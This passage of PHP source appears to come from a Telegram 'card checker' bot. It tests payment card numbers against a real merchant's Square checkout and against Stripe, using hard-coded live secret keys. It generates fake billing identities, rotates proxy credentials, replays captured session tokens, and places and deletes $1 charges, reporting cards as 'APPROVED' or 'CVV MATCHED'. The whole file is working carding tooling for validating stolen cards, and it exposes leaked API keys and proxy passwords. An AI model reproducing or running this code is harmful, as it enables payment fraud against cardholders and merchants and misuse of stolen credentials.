'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};


$rp1 = array(
  1 => 'wzrpvcjj-rotate:10k9w7pbtsae',
//2 => 'fsaddxm-rotate:ahdasd7asud',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}





$ch1 = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch1, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/card-nonce?_=1614654244671.187&version=067ae2dd06');
curl_setopt($ch1, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch1, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: pci-connect.squareup.com';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json; charset=UTF-8';
$headers[] = 'cookie: _savt=74e6df83-bba8-4cf1-968b-0e6b47da37d3';
$headers[] = 'origin: https://pci-connect.squareup.com';
$headers[] = 'referer: https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-Lltz-lsN2H6SrA9lDoorww&host_name=www.trublisscbdco.com&location_id=MVY7SBT6REAED&version=067ae2dd06';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_POSTFIELDS, '{"client_id":"sq0idp-Lltz-lsN2H6SrA9lDoorww","location_id":"MVY7SBT6REAED","session_id":"jK4Cc2qSOlm8WwHp4bkISmbtVvu28EGhrkuhF7-lsilTUugpUChUYOaFF7CZAkNIiJxORDhYL4LQzcUlfYU=","website_url":"https://www.trublisscbdco.com/","squarejs_version":"067ae2dd06","analytics_token":"MK2PKPUPSUIINTRPZ6AKGPDV7SZT4LHF5RM47B6YKIPTPK342K4HE7HM5ZGM3UP77S5PNHK4OCFQ2IQR43PUYAUBWOA67VGO","card_data":{"number":"'.$cc.'","exp_month":'.$mm.',"exp_year":'.$yyyy.',"cvv":"'.$cvv.'","billing_postal_code":"94701"}}');
$result1 = curl_exec($ch1);
$cnon = trim(strip_tags(getStr2($result1,'"card_nonce":"','"'))); 

//================[ 2nd Curl ]================//
$ch2 = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch2, CURLOPT_URL, 'https://www.trublisscbdco.com/ajax.php/downsell');
curl_setopt($ch2, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch2, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.trublisscbdco.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: __cfduid=d2855542aaf208195871c06538f5d62161613664633; PHPSESSID=8e754cbf6e165c4a1c40eec95cd7d99d';
$headers[] = 'origin: https://www.trublisscbdco.com';
$headers[] = 'referer: https://www.trublisscbdco.com/checkout.php';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch2, CURLOPT_POSTFIELDS, 'firstName=Lund&lastName=Lele&shippingAddress1=Loda&shippingCity=Berkeley&shippingState=CA&shippingZip=94701&shippingCountry=US&phone=8888888888&email=lodalelell%40gmail.com&billingSameAsShipping=yes&billingFirstName=&billingLastName=&billingAddress1=&billingCity=&billingCountry=&billingState=&billingZip=&creditCardType=square&creditCardNumber=&expmonth=&expyear=&CVV=&nonce=&nds-pmd=%7B%22jvqtrgQngn%22%3A%7B%22oq%22%3A%221280%3A648%3A1280%3A720%3A1280%3A720%22%2C%22wfi%22%3A%22flap-151081%22%2C%22oc%22%3A%22q400qo6n8n86q525%22%2C%22fe%22%3A%221280k720+24%22%2C%22qvqgm%22%3A%22-330%22%2C%22jxe%22%3A63285%2C%22syi%22%3A%22snyfr%22%2C%22si%22%3A%22si%2Cbtt%2Czc4%2Cjroz%22%2C%22sn%22%3A%22sn%2Czcrt%2Cbtt%2Cjni%22%2C%22us%22%3A%2226rp5o5p2o5sq2po%22%2C%22cy%22%3A%22Jva32%22%2C%22sg%22%3A%22%7B%5C%22zgc%5C%22%3A0%2C%5C%22gf%5C%22%3Asnyfr%2C%5C%22gr%5C%22%3Asnyfr%7D%22%2C%22sp%22%3A%22%7B%5C%22gp%5C%22%3Agehr%2C%5C%22ap%5C%22%3Agehr%7D%22%2C%22sf%22%3A%22gehr%22%2C%22jt%22%3A%22s2nno0055p58o750%22%2C%22sz%22%3A%221rqsq5761s4859n9%22%2C%22vce%22%3A%22apvc%2C0%2C603qnn74%2C2%2C1%3Bfg%2C0%2C%2C0%2C%2C0%2C%2C0%2C%2C0%2C%2C0%2C%2C0%2C%2C0%2Cvas_svryq_Rznvy%2C0%3Bzz%2Cn113%2C57%2C2o%2C%3Bgf%2C0%2Cn113%3Bzzf%2C3r9%2C0%2Cn%2C8r+7r4%2C4q0q+o1pq%2C2126%2C21qp%2C-51028%2Cspr9%2C-o7o7%3Bxx%2C95%2C0%2CsvefgAnzr%3Bss%2C0%2CsvefgAnzr%3Bzp%2C72%2C162%2C197%2CsvefgAnzr%3Bxq%2C187%3Bso%2C7%2CsvefgAnzr%3Bxx%2C5%2C0%2CynfgAnzr%3Bss%2C0%2CynfgAnzr%3Bxq%2C0%3Bso%2C2%2CynfgAnzr%3Bxx%2C5%2C0%2CfuvccvatNqqerff1%3Bss%2C0%2CfuvccvatNqqerff1%3Bxq%2C0%3Bso%2C3%2CfuvccvatNqqerff1%3Bxx%2C3%2C0%2CfuvccvatPvgl%3Bss%2C0%2CfuvccvatPvgl%3Bxq%2C0%3Bso%2C2%2CfuvccvatPvgl%3Bxx%2C2%2C0%2CfuvccvatMvc%3Bss%2C0%2CfuvccvatMvc%3Bxq%2C0%3Bso%2C2%2CfuvccvatMvc%3Bxx%2C4%2C0%2Ccubar%3Bss%2C0%2Ccubar%3Bxq%2C0%3Bso%2C2%2Ccubar%3Bxx%2C3%2C0%2Crznvy%3Bss%2C0%2Crznvy%3Bxq%2C0%3Bso%2C2%2Crznvy%3Bxx%2C2%2C4%2CsvefgAnzr%3Bss%2C0%2CsvefgAnzr%3Bzzf%2C12r%2C3r8%2Cn%2C4n+83%2Co36+pop%2C2s0%2C2s7%2C-9n85%2Cnq1p%2C-p01%3Bso%2C319%2CsvefgAnzr%3Bzp%2C3s%2C18n%2C2o0%2CfuvccvatFgngr%3Bzzf%2C94%2C3rp%2Cn%2Csr+71%2Cnsn+6p82%2Cpop%2Cr14%2C-413s2%2C3opo0%2C-1712%3Bzzf%2C3r4%2C3r4%2Cn%2C0+5o6%2C2o8+922%2C186%2C181%2C-5s46%2C3p1q%2C43%3Bzp%2C1n5%2C0%2C18r%2CfuvccvatFgngr%3Bzz%2Cn%2C194%2C1sr%2CynfgAnzr%3Bzzf%2C23r%2C3rq%2Cn%2C60+7289%2C60+7289%2Co74%2C947%2C-41np8%2C58604%2C2453%3Bzzf%2C3r2%2C3r2%2Cn%2C0+1pn%2C1300+pnns%2C28n0%2C29n0%2C-48662%2C7807n%2C-17n5%3Bzzf%2C3rp%2C3rp%2Cn%2C14so+1740%2C336+8r34%2C115o%2C1105%2C-54nn6%2C48s99%2C942%3Bzzf%2C3r6%2C3r6%2Cn%2CABC%3Bzzf%2C88q%2C88q%2Cn%2CABC%3Bzzf%2C1s4n%2C1s4n%2Cn%2CAnA+AnA%2CAnA+AnA%2CAnA%2C0%2CAnA%2CAnA%2CAnA%3Bgf%2C0%2Cr82p%3Bzzf%2Cos5n%2Cos5n%2C32%2CABC%3Bgf%2C0%2C1n786%3Bzz%2C3112%2C104%2C534%2C%3Bzzf%2C72sr%2Cn410%2C32%2C336+2s81%2C44o+79qr%2C6q7%2C443p%2C-1o936%2C264p5%2C9q%3Bgf%2C0%2C24o96%3Bzz%2C3s50%2Cr8%2C554%2Cznvapbagrag%3Bgf%2C0%2C28nr6%3Bzz%2C12s0%2C12q%2C479%2C%3Bzzf%2C619%2C5859%2C32%2C2qo+6s3%2Cop3+5993%2C52r%2C335s%2C-19r10%2C194pr%2C3n%3Bzp%2Copr%2Cqp%2C55r%2Cfd-perqvgpneq%3B%22%2C%22ns%22%3A%22%22%2C%22qvg%22%3A%22%22%7D%2C%22jg%22%3A%221.j-952168.1.2.ngFtqVprzOChXz1JMsEUZt%2C%2C.yJGokAsqeMKMLLZLP112M_LgZwRkXF8jQPtpCnh0aNmX7x1KZO-hODypUMPnqW7K3vdgAL15bUJxVODzE7XNcSXeOc8hkHuAH91XQuch9emxALJeH4KLqijPSX6QSrdIfSLLZZHdEGLydbMI4qWRwHY13M1GrGGuXIet0PylCsvaxLboDmZ3YiLNYHt0RQFDIRwrvm7aIAUTyC0E_ab6M82DR7fB7nNXR2vRZKgMdSd6ooHD7uNF1WxG_Z8ege-W%22%7D&user_is_at=https%3A%2F%2Fwww.trublisscbdco.com%2Fcheckout.php&square_token='.$cnon.'&billing_postal_code=94701');
$result2 = curl_exec($ch2);
//echo $result2;


$ch3 = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch3, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/v?version=067ae2dd06');
curl_setopt($ch3, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch3, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: pci-connect.squareup.com';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json; charset=UTF-8';
$headers[] = 'cookie: _savt=74e6df83-bba8-4cf1-968b-0e6b47da37d3';
$headers[] = 'origin: https://pci-connect.squareup.com';
$headers[] = 'referer: https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-Lltz-lsN2H6SrA9lDoorww&host_name=www.trublisscbdco.com&location_id=MVY7SBT6REAED&version=067ae2dd06';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch3, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch3, CURLOPT_POSTFIELDS, '{"l":{"d":966,"e":"false"},"e":1,"a":"sq0idp-Lltz-lsN2H6SrA9lDoorww","o":"MVY7SBT6REAED","n":"jK4Cc2qSOlm8WwHp4bkISmbtVvu28EGhrkuhF7-lsilTUugpUChUYOaFF7CZAkNIiJxORDhYL4LQzcUlfYU=","s":"SqPaymentForm","u":"https://pci-connect.squareup.com","v":"https://www.trublisscbdco.com"}');



$info = curl_getinfo($ch2);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if (strpos($result2 , 'Postal code check failed.') || (strpos($result2, 'Postal code check failed.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』 『 ★ Postal Code Check Failed ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, 'Postal code check failed. Card verification code check failed. Card declined.') || (strpos($result2, 'Card verification code check failed.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "Authorization error: 'TRANSACTION_LIMIT'")) {
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV MATCHED ★ 』 『 ★ TRANSACTION_LIMIT ★ 』 </b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, 'Postal code check failed. Card verification code check failed. Card declined.') || (strpos($result2, 'Card verification code check failed.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, 'Card verification code check failed.') || (strpos($result2, 'Card verification code check failed.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "Authorization error: 'ADDRESS_VERIFICATION_FAILURE'")) {
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』 『 ★ Address Verification Failure ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "Authorization error: 'GENERIC_DECLINE'")) {
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Square Up</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}

}

    

//////////////////////////////////////////////////// SK BASED CHECK ////////////////////////////////////////

elseif (strpos($message, "/str") === 0){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$year1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

$skeys = array(
1 => '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',
2 => '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',
//3 => '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',
//4 => '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',
//5 => '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',
//6 => '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',
);
$skey = array_rand($skeys);
$sk = $skeys[$skey];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(GetStr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded"){ 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
$result = curl_exec($ch);
if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
$skresult = "✅APPROVED!";
$skresponse = "CVV MATCHED!";
}else{
$skresult = "UNCHECKED";
$skresponse = "UNAVAILABLE";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "✅APPROVED!";
$skresponse = "CVV MATCHED!";
}
elseif(strpos($result, 'security code is incorrect')){
$skresult = "✅APPROVED!";
$skresponse = "CCN APPROVED!";
}
elseif (isset($c["error"])){
$skresult = "DECLINED!";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
}else{
$skresult = "UNCHECKED";
$skresponse = "CVC CHECK UNCHECKED!";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}

//////////=========[Zee5 Command]=========//////////

